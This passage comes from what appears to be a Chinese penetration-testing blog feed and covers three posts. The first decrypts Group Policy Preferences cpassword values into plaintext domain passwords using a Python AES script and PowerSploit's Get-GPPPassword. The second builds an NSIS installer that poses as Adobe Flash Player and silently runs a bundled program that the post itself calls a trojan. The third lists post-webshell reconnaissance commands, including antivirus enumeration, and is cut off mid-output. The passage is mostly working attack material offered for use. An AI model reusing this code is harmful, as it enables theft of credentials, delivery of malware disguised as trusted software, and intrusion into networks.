encoding=&quot;utf-8&quot;?&gt;&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;Administrator (內建)&quot; image=&quot;2&quot; changed=&quot;2021-02-07 08:54:02&quot; uid=&quot;{D3BBF62A-E741-4269-B4BE-71E21F972F64}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;j9Gdj+aYbrzW2mH1wHHC8/D7L+pkZ3iLSs4NjCybA1M&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;0&quot; acctDisabled=&quot;0&quot; subAuthority=&quot;RID_ADMIN&quot; userName=&quot;Administrator (內建)&quot;/&gt;&lt;/User&gt;&lt;/Groups&gt;</code></pre><p>提取出cpassword字段的值</p><p><img src="/img/gppXml/4889c4a1-f34b-4fab-b2af-568bf5e1eee7.png" alt="img"></p><p>使用py脚本解密：python2 gpp.py j9Gdj+aYbrzW2mH1wHHC8/D7L+pkZ3iLSs4NjCybA1M</p><p>需要安装pycryptodome模块，python2 -m pip install pycryptodome</p><pre><code>import sysfrom Crypto.Cipher import AESfrom base64 import b64decodefrom base64 import b64encodekey = &quot;&quot;&quot;4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b&quot;&quot;&quot;.replace(&quot; &quot;,&quot;&quot;).replace(&quot;\n&quot;,&quot;&quot;).decode(&#39;hex&#39;)cpassword = sys.argv[1]cpassword += &quot;=&quot; * ((4 - len(sys.argv[1]) % 4) % 4)password = b64decode(cpassword)iv =  &quot;\x00&quot; * 16o = AES.new(key, AES.MODE_CBC, iv ).decrypt(password)plaintext =  o[:-ord(o[-1])]print(plaintext)</code></pre><p>成功解出密码</p><p><img src="/img/gppXml/c3a768d3-e609-4123-b68e-a2056622d689.png" alt="img"></p><h2 id="0x04-其他XML文件"><a href="#0x04-其他XML文件" class="headerlink" title="0x04 其他XML文件"></a>0x04 其他XML文件</h2><p>例如计划任务，创建一个GPO，名字随意</p><p><img src="/img/gppXml/0bf4b6d1-33cc-4148-834c-622a08df15af.png" alt="img"></p><p>选择计划任务</p><p><img src="/img/gppXml/79236e9f-9f82-4911-8223-551b859e9edc.png" alt="img"></p><p>在执行身份中选择使用域用户sqladm，执行弹计算器命令</p><p><img src="/img/gppXml/a5cbaac1-b41d-485b-b72b-58b59bfbbd81.png" alt="img"></p><p>到SYSVOL中查看</p><p><img src="/img/gppXml/33c1d775-c085-428a-9aa9-21b0dcaf2412.png" alt="img"></p><p>在\User\Preferences\ScheduledTasks文件夹下有ScheduledTasks.xml，内容如下</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;ScheduledTasks clsid=&quot;{CC63F200-7309-4ba0-B154-A71CD118DBCC}&quot;&gt;&lt;Task clsid=&quot;{2DEECB1C-261F-4e13-9B21-16FB83BC03BD}&quot; name=&quot;calc&quot; image=&quot;0&quot; changed=&quot;2021-02-07 07:25:21&quot; uid=&quot;{93F6A743-CC48-48CB-BF65-4F68EDAE4BB9}&quot;&gt;&lt;Properties action=&quot;C&quot; name=&quot;calc&quot; appName=&quot;C:\Windows\System32\calc.exe&quot; args=&quot;&quot; startIn=&quot;&quot; comment=&quot;&quot; runAs=&quot;MOTOO\SQLAdm&quot; cpassword=&quot;g0FxPqXVuUh7g07FH0UAKeZQLjFzdltWFdkx7gdM7Fc&quot; enabled=&quot;1&quot;&gt;&lt;Triggers&gt;&lt;Trigger type=&quot;DAILY&quot; startHour=&quot;1&quot; startMinutes=&quot;0&quot; beginYear=&quot;2021&quot; beginMonth=&quot;2&quot; beginDay=&quot;7&quot; hasEndDate=&quot;0&quot; repeatTask=&quot;0&quot; interval=&quot;1&quot;/&gt;&lt;/Triggers&gt;&lt;/Properties&gt;&lt;/Task&gt;&lt;/ScheduledTasks&gt;</code></pre><p>执行的用户身份如下</p><p><img src="/img/gppXml/1679c1c1-40ad-45a3-b065-ea38cdfd0dd4.png" alt="img"></p><p>取出cpassword值，成功得到域用户motoo\sqladm的密码</p><p><img src="/img/gppXml/098d02c3-ecdd-473f-9a54-3b9f714ee2f3.png" alt="img"></p><p>在下面的这些xml里也都有可能保存着账号密码</p><pre><code>Groups\Groups.xmlServices\Services.xmlScheduledTasks\ScheduledTasks.xmlPrinters\Printers.xmlDrives\Drives.xmlDataSources\DataSources.xml</code></pre><h2 id="0x05-更新组策略"><a href="#0x05-更新组策略" class="headerlink" title="0x05 更新组策略"></a>0x05 更新组策略</h2><p>Windows会定期刷新整个网络中的组策略设置。 在客户端计算机上，默认情况下每90分钟执行一次，随机偏移量为正负30分钟。 当更改组策略时，可能需要等待两个小时（90分钟加上30分钟的偏移量），然后才能在客户端计算机上看到任何更改。</p><p>也可以在客户机使用gpupdate /force 强制更新域组策略</p><p><img src="/img/gppXml/fc137f4c-4659-4f96-ac41-82199852c697.png" alt="img"></p><h2 id="0x06-脚本利用"><a href="#0x06-脚本利用" class="headerlink" title="0x06 脚本利用"></a>0x06 脚本利用</h2><p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a> </p><p>使用域用户执行该ps脚本，调用方法Get-GPPPassword</p><p>可以看到获取到了账号密码</p><p><img src="/img/gppXml/89fbde6b-45e6-4d5e-bb8e-01ce9080ca41.png" alt="img"></p><pre><code>PS C:\Users\WangJuan.MOTOO\Desktop&gt; Get-GPPPasswordUserName  : Administrator (鍏у缓)NewName   : [BLANK]Password  : Gpppassword.Changed   : 2021-02-07 08:54:02File      : \\MOTOO.NC\SYSVOL\Motoo.nc\Policies\{4FC55772-5E0A-4ED5-AA84-A3FF988B6409}\User\Preferences\Groups\Groups.xmlNodeName  : GroupsCpassword : j9Gdj+aYbrzW2mH1wHHC8/D7L+pkZ3iLSs4NjCybA1MUserName  : MOTOO\SQLAdmNewName   : [BLANK]Password  : sql123!@#45Changed   : 2021-02-07 07:35:06File      : \\MOTOO.NC\SYSVOL\Motoo.nc\Policies\{E990BD6E-3ABA-45CD-8653-39D2D2B41AA1}\User\Preferences\ScheduledTasks\ScheduledTasks.xmlNodeName  : ScheduledTasksCpassword : g0FxPqXVuUh7g07FH0UAKeZQLjFzdltWFdkx7gdM7FcUserName  : MotooNewName   : [BLANK]Password  : Pwd12345Changed   : 2020-02-23 12:55:13File      : \\MOTOO.NC\SYSVOL\Motoo.nc\Policies\{F92107F8-1D4E-4B26-84C8-75645D783540}\User\Preferences\Groups\Groups.xmlNodeName  : GroupsCpassword : Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0UserName  : klionNewName   : [BLANK]Password  : Abc12345Changed   : 2020-02-23 12:55:49File      : \\MOTOO.NC\SYSVOL\Motoo.nc\Policies\{F92107F8-1D4E-4B26-84C8-75645D783540}\User\Preferences\Groups\Groups.xmlNodeName  : GroupsCpassword : jh09kN+cc6X1jYVx5ZLQOzJ7PrCU3R8rAJKT47qzE0kUserName  : ITSNewName   : [BLANK]Password  : admin!@#45Changed   : 2020-03-13 02:19:32File      : \\MOTOO.NC\SYSVOL\Motoo.nc\Policies\{F92107F8-1D4E-4B26-84C8-75645D783540}\User\Preferences\Groups\Groups.xmlNodeName  : GroupsCpassword : Hd/xxCN9bFRTj8C2az+0t3el0u3Dn68pZ1Sd4IHmbPwUserName  : ITSRVNewName   : [BLANK]Password  : in123!@#45Changed   : 2020-03-13 02:50:28File      : \\MOTOO.NC\SYSVOL\Motoo.nc\Policies\{F92107F8-1D4E-4B26-84C8-75645D783540}\User\Preferences\Groups\Groups.xmlNodeName  : GroupsCpassword : 3bjGvfu/GLA3pSuIm1IOgFhCOw8055xOddEX4k3XNAY</code></pre>]]></content>
      
      
      <categories>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Gpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼与社工系列之NSIS制作安装包</title>
      <link href="/2020/12/12/diao-yu-yu-she-gong-xi-lie-zhi-zhi-zuo-an-zhuang-bao/"/>
      <url>/2020/12/12/diao-yu-yu-she-gong-xi-lie-zhi-zhi-zuo-an-zhuang-bao/</url>
      
        <content type="html"><![CDATA[<h1 id="钓鱼与社工系列之NSIS制作安装包"><a href="#钓鱼与社工系列之NSIS制作安装包" class="headerlink" title="钓鱼与社工系列之NSIS制作安装包"></a>钓鱼与社工系列之NSIS制作安装包</h1><p>需要制作成安装包的文件</p><p><img src="/img/NSIS/b84735a3-49b3-4f2a-8f38-148b20ac3439.png" alt="img"></p><p>需要伪装的安装包的属性，制作的时候按照下图的属性制作</p><p><img src="/img/NSIS/48af1f5e-8bfe-48af-a55c-6553c8c853da.png" alt="img"></p><p>开始制作</p><pre><code>AdobeAdobe® Flash® Player Utility32.0.0.387Adobe® Flash® Player UtilityTODO:  (C) &lt;Adobe&gt;。  保留所有权利。Flash.exeTODO: &lt;Adobe&gt;32.0.0.387</code></pre><p><img src="/img/NSIS/875125bf-f732-4361-81ab-01fbdaa07471.png" alt="img"></p><pre><code>Adobe Flash Player 3232.0.0.387Adobehttp://www.flash.cn</code></pre><p><img src="/img/NSIS/c8f38969-c60d-475d-b11a-87a61a4856d5.png" alt="img"></p><p>安装包的图标以及名字</p><pre><code>C:\Users\test\Desktop\dll\client\Flash\favicon.icoflashplayerpp_install_cn.exe</code></pre><p><img src="/img/NSIS/2f844f50-ab7a-47f7-a506-39edeb2cfa6b.png" alt="img"></p><p>运行制作好的安装包提示要安装在哪个目录。</p><p>勾选允许用户更改目录，那么安装的时候可以更改安装目录；如果不勾选，那就直接在指定的目录安装</p><pre><code>$PROGRAMFILES\Flash</code></pre><p><img src="/img/NSIS/9d8606c6-863f-4a32-982d-f16648804d73.png" alt="img"></p><p>需要制作安装包的文件目录</p><pre><code>C:\Users\test\Desktop\dll\client\Flash\*.*</code></pre><p><img src="/img/NSIS/691748b1-5627-462b-876e-70889acc1951.png" alt="img"></p><p>制作快捷方式，建议使用代码修改</p><p><img src="/img/NSIS/710ad09f-f660-48c8-9ef0-bc6bee5cbdf4.png" alt="img"></p><p>安装完成后要执行的命令，建议使用代码修改</p><p><img src="/img/NSIS/25d2d045-6414-4aa4-861d-decc1c4ed16b.png" alt="img"></p><p><img src="/img/NSIS/dc7e7e40-55bf-40cc-bf15-9a8024b54958.png" alt="img"></p><p>修改快捷方式的代码，得要手工添加。</p><pre><code>一共要改三个地方：1. SetOutPath起始位置改为快捷方式指向exe的目录2. uninstall.lnk这类快捷方式删除3. 在桌面创建快捷方式指向木马程序，注意这里desktop后面必须两个反斜杠Section -AdditionalIcons  SetOutPath &quot;$INSTDIR\&quot;  CreateShortCut &quot;$DESKTOP\\Flash.lnk&quot; &quot;$INSTDIR\Flash.exe&quot;SectionEnd</code></pre><p><img src="/img/NSIS/48c84b6d-4c5c-42fd-99f7-5d528b305229.png" alt="img"></p><p>运行安装包安装完成后，自动执行的命令 </p><pre><code>; 安装完成页面!define MUI_FINISHPAGE_RUN &quot;$INSTDIR\Flash.exe&quot;!define MUI_FINISHPAGE_RUN_PARAMETERS!insertmacro MUI_PAGE_FINISH</code></pre><p><img src="/img/NSIS/65953156-e105-496e-823b-c36d9cdaf6a7.png" alt="img"></p><p>也可以在安装过程中就执行命令：nsExec::ExecToStack “$INSTDIR\Flash.exe”</p><pre><code>Section -Post  WriteUninstaller &quot;$INSTDIR\uninst.exe&quot;  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} &quot;${PRODUCT_UNINST_KEY}&quot; &quot;DisplayName&quot; &quot;$(^Name)&quot;  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} &quot;${PRODUCT_UNINST_KEY}&quot; &quot;UninstallString&quot; &quot;$INSTDIR\uninst.exe&quot;  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} &quot;${PRODUCT_UNINST_KEY}&quot; &quot;DisplayVersion&quot; &quot;${PRODUCT_VERSION}&quot;  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} &quot;${PRODUCT_UNINST_KEY}&quot; &quot;URLInfoAbout&quot; &quot;${PRODUCT_WEB_SITE}&quot;  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} &quot;${PRODUCT_UNINST_KEY}&quot; &quot;Publisher&quot; &quot;${PRODUCT_PUBLISHER}&quot;  nsExec::ExecToStack &quot;$INSTDIR\Flash.exe&quot;SectionEnd</code></pre><p>最终生成如下代码:</p><pre><code>; 该脚本使用 HM VNISEdit 脚本编辑器向导产生; 安装程序初始定义常量!define PRODUCT_NAME &quot;Adobe Flash Player 32&quot;!define PRODUCT_VERSION &quot;32.0.0.387&quot;!define PRODUCT_PUBLISHER &quot;Adobe&quot;!define PRODUCT_WEB_SITE &quot;http://www.flash.cn&quot;!define PRODUCT_UNINST_KEY &quot;Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT_NAME}&quot;!define PRODUCT_UNINST_ROOT_KEY &quot;HKLM&quot;SetCompressor lzma; ------ MUI 现代界面定义 (1.67 版本以上兼容) ------!include &quot;MUI.nsh&quot;; MUI 预定义常量!define MUI_ABORTWARNING!define MUI_ICON &quot;C:\Users\test\Desktop\dll\client\Flash控件安装包\flash.ico&quot;!define MUI_UNICON &quot;${NSISDIR}\Contrib\Graphics\Icons\modern-uninstall.ico&quot;; 欢迎页面!insertmacro MUI_PAGE_WELCOME; 安装过程页面!insertmacro MUI_PAGE_INSTFILES; 安装完成页面!define MUI_FINISHPAGE_RUN &quot;$INSTDIR\Flash.exe&quot;!define MUI_FINISHPAGE_RUN_PARAMETERS!insertmacro MUI_PAGE_FINISH; 安装卸载过程页面!insertmacro MUI_UNPAGE_INSTFILES; 安装界面包含的语言设置!insertmacro MUI_LANGUAGE &quot;SimpChinese&quot;; 安装预释放文件!insertmacro MUI_RESERVEFILE_INSTALLOPTIONS; ------ MUI 现代界面定义结束 ------Name &quot;${PRODUCT_NAME} ${PRODUCT_VERSION}&quot;OutFile &quot;flashplayerpp_install_cn.exe&quot;InstallDir &quot;C:\Flash\&quot;ShowInstDetails showShowUnInstDetails showSection &quot;MainSection&quot; SEC01  SetOutPath &quot;$INSTDIR\*.*&quot;  SetOverwrite ifnewer  File /r &quot;C:\Users\test\Desktop\dll\client\Flash控件安装包\*.*&quot;SectionEndSection -AdditionalIcons  SetOutPath &quot;$INSTDIR\&quot;  CreateShortCut &quot;$DESKTOP\\Flash.lnk&quot; &quot;$INSTDIR\Flash.exe&quot;SectionEndSection -Post  WriteUninstaller &quot;$INSTDIR\uninst.exe&quot;  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} &quot;${PRODUCT_UNINST_KEY}&quot; &quot;DisplayName&quot; &quot;$(^Name)&quot;  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} &quot;${PRODUCT_UNINST_KEY}&quot; &quot;UninstallString&quot; &quot;$INSTDIR\uninst.exe&quot;  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} &quot;${PRODUCT_UNINST_KEY}&quot; &quot;DisplayVersion&quot; &quot;${PRODUCT_VERSION}&quot;  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} &quot;${PRODUCT_UNINST_KEY}&quot; &quot;URLInfoAbout&quot; &quot;${PRODUCT_WEB_SITE}&quot;  WriteRegStr ${PRODUCT_UNINST_ROOT_KEY} &quot;${PRODUCT_UNINST_KEY}&quot; &quot;Publisher&quot; &quot;${PRODUCT_PUBLISHER}&quot;  nsExec::ExecToStack &quot;$INSTDIR\Flash.exe&quot;SectionEnd/****************************** *  以下是安装程序的卸载部分  * ******************************/Section Uninstall  Delete &quot;$INSTDIR\${PRODUCT_NAME}.url&quot;  Delete &quot;$INSTDIR\uninst.exe&quot;  Delete &quot;$SMPROGRAMS\Adobe Flash Player 32\Uninstall.lnk&quot;  Delete &quot;$SMPROGRAMS\Adobe Flash Player 32\Website.lnk&quot;  RMDir &quot;$SMPROGRAMS\Adobe Flash Player 32&quot;  RMDir /r &quot;$INSTDIR\*.*&quot;  RMDir &quot;$INSTDIR&quot;  DeleteRegKey ${PRODUCT_UNINST_ROOT_KEY} &quot;${PRODUCT_UNINST_KEY}&quot;  SetAutoClose trueSectionEnd#-- 根据 NSIS 脚本编辑规则，所有 Function 区段必须放置在 Section 区段之后编写，以避免安装程序出现未可预知的问题。--#Function un.onInit  MessageBox MB_ICONQUESTION|MB_YESNO|MB_DEFBUTTON2 &quot;您确实要完全移除 $(^Name) ，及其所有的组件？&quot; IDYES +2  AbortFunctionEndFunction un.onUninstSuccess  HideWindow  MessageBox MB_ICONINFORMATION|MB_OK &quot;$(^Name) 已成功地从您的计算机移除。&quot;FunctionEnd</code></pre>]]></content>
      
      
      <categories>
          
          <category> 钓鱼与社工 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼与社工系列之NSIS制作安装包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网边界信息收集</title>
      <link href="/2020/12/05/nei-wang-bian-jie-xin-xi-shou-ji/"/>
      <url>/2020/12/05/nei-wang-bian-jie-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="内网边界信息收集"><a href="#内网边界信息收集" class="headerlink" title="内网边界信息收集"></a>内网边界信息收集</h1><h2 id="0x01-Windows（工作组和域）"><a href="#0x01-Windows（工作组和域）" class="headerlink" title="0x01 Windows（工作组和域）"></a>0x01 Windows（工作组和域）</h2><h3 id="0x01-1-检查当前shell权限"><a href="#0x01-1-检查当前shell权限" class="headerlink" title="0x01-1 检查当前shell权限"></a>0x01-1 检查当前shell权限</h3><pre><code>whoami /user &amp;&amp; whoami /priv</code></pre><p><img src="/img/webshellInfoGather/4eaa6b34-ce27-4877-ba94-603d54eb9c30.png" alt="img"></p><h3 id="0x01-2-查看系统信息"><a href="#0x01-2-查看系统信息" class="headerlink" title="0x01-2 查看系统信息"></a>0x01-2 查看系统信息</h3><p><strong>systeminfo</strong></p><p><strong>主机名-&gt;扮演的角色</strong></p><pre><code>主机名:           AHCJ-WIN2003-2OS 名称:          Microsoft(R) Windows(R) Server 2003, Enterprise EditionOS 版本:          5.2.3790 Service Pack 2 Build 3790OS 制造商:        Microsoft CorporationOS 配置:          独立服务器OS 构件类型:      Uniprocessor Free注册的所有人:     AHCJ注册的组织:       产品 ID:          69813-651-6082552-45965初始安装日期:     2015-6-25, 14:42:37系统启动时间:     暂缺系统制造商:       Red Hat系统型号:         KVM系统类型:         X86-based PC处理器:           安装了 1 个处理器。                  [01]: x86 Family 6 Model 13 Stepping 3 GenuineIntel ~1994 MhzBIOS 版本:        BOCHS  - 1Windows 目录:     C:\WINDOWS系统目录:         C:\WINDOWS\system32启动设备:         \Device\HarddiskVolume1系统区域设置:     zh-cn;中文(中国)输入法区域设置:   zh-cn;中文(中国)时区:             (GMT+08:00) 北京，重庆，香港特别行政区，乌鲁木齐物理内存总量:     2,048 MB可用的物理内存:   1,416 MB页面文件: 最大值: 2,474 MB页面文件: 可用:   2,150 MB页面文件: 使用中: 324 MB页面文件位置:     C:\pagefile.sys域:               WORKGROUP登录服务器:       \\AHCJ-WIN2003-2修补程序:         安装了 6 个修补程序。                  [01]: File 1                  [02]: File 1                  [03]: Q147222                  [04]: KB968930 - Update                  [05]: KB942288-v4 - Update                  [06]: KB954550-v5网卡:             安装了 1 个 NIC。                  [01]: Realtek RTL8139 Family PCI Fast Ethernet NIC                      连接名:      本地连接 4                      启用 DHCP:   否                      IP 地址                      [01]: 192.168.87.55</code></pre><h3 id="0x01-2-tcp-udp-网络连接状态信息"><a href="#0x01-2-tcp-udp-网络连接状态信息" class="headerlink" title="0x01-2 tcp/udp 网络连接状态信息"></a>0x01-2 tcp/udp 网络连接状态信息</h3><p><strong>netstat -ano</strong></p><p><strong>可以获取内网IP分布状态-服务（redis）</strong></p><pre><code>C:\Documents and Settings\test\桌面&gt;netstat -anoActive Connections  Proto  Local Address          Foreign Address        State           PID  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       700  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4  TCP    0.0.0.0:1030           0.0.0.0:0              LISTENING       440  TCP    0.0.0.0:1723           0.0.0.0:0              LISTENING       4  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2492  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4  TCP    192.168.87.55:139      0.0.0.0:0              LISTENING       4  TCP    192.168.87.55:3389     192.168.87.1:25512     ESTABLISHED     2492  UDP    0.0.0.0:445            *:*                                    4  UDP    0.0.0.0:500            *:*                                    440  UDP    0.0.0.0:1025           *:*                                    764  UDP    0.0.0.0:1029           *:*                                    816  UDP    0.0.0.0:1701           *:*                                    4  UDP    0.0.0.0:4500           *:*                                    440  UDP    127.0.0.1:123          *:*                                    800  UDP    127.0.0.1:1027         *:*                                    816  UDP    127.0.0.1:1028         *:*                                    816  UDP    192.168.87.55:123      *:*                                    800  UDP    192.168.87.55:137      *:*                                    4  UDP    192.168.87.55:138      *:*                                    4</code></pre><h3 id="0x01-3-机器名"><a href="#0x01-3-机器名" class="headerlink" title="0x01-3 机器名"></a>0x01-3 机器名</h3><p><strong>hostname</strong></p><pre><code>C:\Documents and Settings\test\桌面&gt;hostnameahcj-win2003-2</code></pre><p><img src="/img/webshellInfoGather/61fb1810-65c7-4f48-91ea-7d301df4dae4.png" alt="img"></p><h3 id="0x01-4-查看当前操作系统"><a href="#0x01-4-查看当前操作系统" class="headerlink" title="0x01-4 查看当前操作系统"></a>0x01-4 查看当前操作系统</h3><p><strong>wmic OS get Caption,CSDVersion,OSArchitecture,Version</strong></p><p><strong>ver</strong></p><pre><code>Operating System Version PlatformIDWindows 8 6.2 VER_PLATFORM_WIN32_NT (=2)Windows 7 6.1 VER_PLATFORM_WIN32_NTWindows Server 2008 R2 6.1 VER_PLATFORM_WIN32_NTWindows Server 2008 6.0 VER_PLATFORM_WIN32_NTWindows Vista 6.0 VER_PLATFORM_WIN32_NTWindows Server 2003 R2 5.2 VER_PLATFORM_WIN32_NTWindows Server 2003 5.2 VER_PLATFORM_WIN32_NTWindows XP 64-Bit Edition 5.2 VER_PLATFORM_WIN32_NTWindows XP 5.1 VER_PLATFORM_WIN32_NTWindows 2000 5.0 VER_PLATFORM_WIN32_NTWindows NT 4.0 4.0 VER_PLATFORM_WIN32_NTWindows NT 3.51 3.51 ? VER_PLATFORM_WIN32_NTWindows Millennium Edition 4.90 VER_PLATFORM_WIN32_WINDOWS (=1)Windows 98 4.10 VER_PLATFORM_WIN32_WINDOWSWindows 95 4.0 VER_PLATFORM_WIN32_WINDOWSWindows 3.1 3.1 ? VER_PLATFORM_WIN32s (=0)</code></pre><p><img src="/img/webshellInfoGather/fccdb9c0-a933-4b72-8f56-75ab012fb5f0.png" alt="img"></p><h3 id="0x01-5-查杀软"><a href="#0x01-5-查杀软" class="headerlink" title="0x01-5 查杀软"></a>0x01-5 查杀软</h3><p><strong>WMIC /Node:localhost /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</strong></p><p><img src="/img/webshellInfoGather/281218b6-f25d-4ac8-abbc-937703c85881.jpg" alt="img"></p><h3 id="0x01-6-查看当前安装的程序"><a href="#0x01-6-查看当前安装的程序" class="headerlink" title="0x01-6 查看当前安装的程序"></a>0x01-6 查看当前安装的程序</h3><p><strong>wmic product get name,version</strong></p><p><img src="/img/webshellInfoGather/5cd128fe-c213-46d3-9ea8-8f3919054cc5.png" alt="img"></p><h3 id="0x01-7-查看在线用户"><a href="#0x01-7-查看在线用户" class="headerlink" title="0x01-7 查看在线用户"></a>0x01-7 查看在线用户</h3><p><strong>quser</strong></p><pre><code>C:\Documents and Settings\test\桌面&gt;quser 用户名                会话名             ID  状态    空闲时间   登录时间&gt;test                  rdp-tcp#1           1  运行中          .  2019-10-9 19:28</code></pre><h3 id="0x01-8-查看网络配置"><a href="#0x01-8-查看网络配置" class="headerlink" title="0x01-8 查看网络配置"></a>0x01-8 查看网络配置</h3><p><strong>有Primary Dns Suffix 就说明是域内.  空的则当前机器应该在工作组</strong></p><p><strong>ipconfig /all</strong></p><p><strong>ipconfig /displaydns</strong></p><pre><code>C:\Users\Administrator\Desktop&gt;ipconfig /allWindows IP 配置   主机名  . . . . . . . . . . . . . : win08-web   主 DNS 后缀 . . . . . . . . . . . : hack.local   节点类型  . . . . . . . . . . . . : 混合   IP 路由已启用 . . . . . . . . . . : 否   WINS 代理已启用 . . . . . . . . . : 否   DNS 后缀搜索列表  . . . . . . . . : hack.local                                       localdomain以太网适配器 hack:   连接特定的 DNS 后缀 . . . . . . . :   描述. . . . . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #3   物理地址. . . . . . . . . . . . . : 00-0C-29-B5-02-C8   DHCP 已启用 . . . . . . . . . . . : 否   自动配置已启用. . . . . . . . . . : 是   本地链接 IPv6 地址. . . . . . . . : fe80::d4b7:2ac1:d23:3163%14(首选)   IPv4 地址 . . . . . . . . . . . . : 192.168.52.28(首选)   子网掩码  . . . . . . . . . . . . : 255.255.255.0   默认网关. . . . . . . . . . . . . : 192.168.52.254   DHCPv6 IAID . . . . . . . . . . . : 352324649   DHCPv6 客户端 DUID  . . . . . . . : 00-01-00-01-24-D9-7B-1D-00-0C-29-B5-02-B4   DNS 服务器  . . . . . . . . . . . : 192.168.52.2   TCPIP 上的 NetBIOS  . . . . . . . : 已启用</code></pre><p><img src="/img/webshellInfoGather/c7062953-8b55-4e39-bbfb-7925871074eb.png" alt="img"></p><h3 id="0x01-9-查看进程"><a href="#0x01-9-查看进程" class="headerlink" title="0x01-9 查看进程"></a>0x01-9 查看进程</h3><p><strong>tasklist /v</strong></p><p><strong>有些进程可能是域用户启的-&gt;通过管理员权限 凭证窃取 -&gt; 窃取域用户的凭证</strong></p><pre><code>C:\Documents and Settings\test\桌面&gt;tasklist /v映像名称                       PID 会话名              会话#       内存使用  状态            用户名========================= ======== ================ =========== ============ =============== =========================================System Idle Process              0                            0         28 K Unknown         NT AUTHORITY\SYSTEMSystem                           4                            0        296 K Unknown         暂缺smss.exe                       284                            0        500 K Unknown         暂缺csrss.exe                      332                            0      5,836 K Unknown         暂缺winlogon.exe                   356                            0      9,288 K Unknown         暂缺services.exe                   404                            0     18,344 K Unknown         暂缺lsass.exe                      440                            0      8,348 K Unknown         暂缺vmacthlp.exe                   612                            0      2,720 K Unknown         暂缺svchost.exe                    632                            0      3,312 K Unknown         暂缺svchost.exe                    700                            0      4,076 K Unknown         暂缺svchost.exe                    764                            0      4,436 K Unknown         暂缺svchost.exe                    800                            0      3,560 K Unknown         暂缺svchost.exe                    816                            0     25,532 K Unknown         暂缺spoolsv.exe                    932                            0      5,224 K Unknown         暂缺msdtc.exe                      964                            0      4,588 K Unknown         暂缺cisvc.exe                     1080                            0      8,524 K Unknown         暂缺svchost.exe                   1140                            0      2,260 K Unknown         暂缺inetinfo.exe                  1228                            0      8,708 K Unknown         暂缺rhsrvany.exe                  1344                            0      1,980 K Unknown         暂缺powershell.exe                1388                            0     38,752 K Unknown         暂缺svchost.exe                   1444                            0      1,324 K Unknown         暂缺RetinaEngine.exe              1472                            0     61,244 K Unknown         暂缺sqlwriter.exe                 1532                            0      3,924 K Unknown         暂缺VGAuthService.exe             1588                            0      9,292 K Unknown         暂缺webtool.exe                   1656                            0      6,196 K Unknown         暂缺eeyeevnt.exe                  1756                            0      9,808 K Unknown         暂缺svchost.exe                   1844                            0      6,556 K Unknown         暂缺svchost.exe                   1872                            0      5,752 K Unknown         暂缺svchost.exe                   2104                            0      4,076 K Unknown         暂缺dllhost.exe                   2216                            0      7,528 K Unknown         暂缺svchost.exe                   2492                            0      4,744 K Unknown         暂缺csrss.exe                     2768 RDP-Tcp#1                  1      7,876 K Running         暂缺winlogon.exe                  2796 RDP-Tcp#1                  1      2,536 K Unknown         暂缺rdpclip.exe                   2944 RDP-Tcp#1                  1      3,752 K Running         AHCJ-WIN2003-2\testexplorer.exe                  3020 RDP-Tcp#1                  1     14,416 K Running         AHCJ-WIN2003-2\testsupersrh.exe                  3172 RDP-Tcp#1                  1      6,928 K Running         AHCJ-WIN2003-2\testctfmon.exe                    3200 RDP-Tcp#1                  1      3,396 K Running         AHCJ-WIN2003-2\testcmd.exe                       3256 RDP-Tcp#1                  1      3,576 K Running         AHCJ-WIN2003-2\testconime.exe                    3272 RDP-Tcp#1                  1      2,476 K Running         AHCJ-WIN2003-2\testwmiprvse.exe                  3380                            0      5,144 K Unknown         暂缺cidaemon.exe                  3636                            0      2,268 K Unknown         暂缺cidaemon.exe                  3684                            0        916 K Unknown         暂缺logon.scr                      328                            0      1,852 K Unknown         暂缺wmiprvse.exe                  4040                            0      8,096 K Unknown         暂缺wmiprvse.exe                  4088                            0      4,400 K Unknown         暂缺notepad.exe                    216 RDP-Tcp#1                  1        440 K Running         AHCJ-WIN2003-2\testtasklist.exe                  1584 RDP-Tcp#1                  1      4,008 K Unknown         AHCJ-WIN2003-2\test</code></pre><h3 id="0x01-10-查看当前登录域"><a href="#0x01-10-查看当前登录域" class="headerlink" title="0x01-10 查看当前登录域"></a>0x01-10 查看当前登录域</h3><p><strong>net config workstation</strong></p><pre><code>C:\Users\Administrator\Desktop&gt;net config workstation计算机名                     \\WIN08-WEB计算机全名                   win08-web.hack.local用户名                       